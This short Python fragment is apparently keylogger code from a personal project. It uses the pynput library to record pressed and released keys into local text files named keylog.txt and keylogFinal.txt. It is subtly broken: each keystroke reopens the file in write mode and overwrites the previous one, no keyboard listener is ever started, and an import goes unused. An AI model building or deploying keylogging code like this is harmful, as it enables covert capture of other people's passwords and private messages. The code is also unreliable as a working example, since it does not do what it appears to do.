from pynput import keyboard
import time

# Function to handle key press events and save them to a file with UTF-8 encoding
def on_key_event(key, is_press=True):
    try:
        if is_press:
            with open("Pseudo Project/keylogFinal.txt", "w", encoding='utf-8') as f:
                char = key.char if hasattr(key, 'char') else str(key)
                f.write(char)
        else:
            with open("Pseudo Project/keylog.txt", "w", encoding='utf-8') as f:
                f.write('Key released: {0}\n'.format(key))
    except AttributeError:
        pass  # Handle special keys gracefully